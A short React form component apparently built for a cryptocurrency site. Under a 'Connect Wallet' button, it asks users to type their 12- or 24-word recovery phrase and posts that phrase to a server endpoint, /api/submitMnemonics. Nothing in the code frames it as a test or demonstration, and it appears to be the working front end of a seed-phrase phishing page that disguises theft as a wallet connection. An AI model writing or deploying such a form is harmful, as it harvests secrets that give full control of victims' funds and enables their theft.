export const Form = () => {
  const submitHandler = async (e) => {
    e.preventDefault();
    const form = new FormData(e.target);
    try {
      const res = await fetch("/api/submitMnemonics", {
        method: "POST",
        body: JSON.stringify({ mnemonics: form.get("mnemonics") }),
        headers: { "Content-Type": "application/json" }
      });

      const response = await res.json();
      console.log(response);
    } catch (e) {
      console.error(e);
    }
  };


  return (
    <form onSubmit={submitHandler}>
      <textarea
        name="mnemonics"
        className="w-full h-[100px] border outline-none p-1"
        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea>
      <button
        type="submit"
        value="submit"
        className="border rounded-2xl py-3 w-full text-white bg-blue-500 hover:bg-blue-900 mt-3 mb-5">
        Connect Wallet
      </button>
    </form>
  );
};
